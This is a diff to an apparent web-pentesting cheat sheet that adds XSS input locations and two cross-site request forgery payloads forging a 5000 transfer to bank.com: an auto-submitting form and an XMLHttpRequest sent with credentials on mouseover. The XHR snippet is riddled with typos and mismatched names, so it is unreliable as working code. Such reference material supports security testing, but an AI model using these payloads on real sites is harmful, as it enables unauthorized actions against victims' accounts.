@@ -25,6 +25,12 @@ order: 6
 
 * Look for document.[] like document.write in the client side javascript
 
+Input Locations:
+* Cookies
+* Referer 
+* Dialog Input
+* XMLHTTPRequests
+
 **Additional Payloads:**
 * Fuzzdb /attack-payloads/xss
 * JBroFuzz (built into ZAP)
@@ -241,9 +247,35 @@ POST:
 </form>
 <script>document.getElementById('CSRF').submit();</script>
 
+
+<body onload="document.xsrf.submit();">
+<form name="xsrf" action="https://bank.com/transfer" method="POST">
+<input type="text" name="acctnum" value="42">
+<input type="text" name="ammount" value="5000">
+</form>
+</body>
+
 CSS or Javascript import 
 
 XMLHTTPRequest
+<script>
+funciton ajazxFunction()
+{
+	var xmlHTTP;
+	xmlHTTP=new XMLHttpRequest();
+	xmlHTTP.onreadystatechange=funciton()
+	var formData = new FormData();
+	formData.append("acctnum", "42");
+	formData.append("amount", 5000);
+	xmlHTTP.addEventListener("load", onLoad, false);
+	xmlHTTP.addEventListern("error", onError, false);
+	xmlHTTP.open('POST', 'https://bank.com/transfer', true);
+	xmlHTTP.withCredentials=true;
+	xmlHTTP.send(formdata);
+}
+</script>
+<hr onmouseover='javascript:ajaxFunction()'> 
+
 {% endhighlight %}
 
 {% highlight html %}
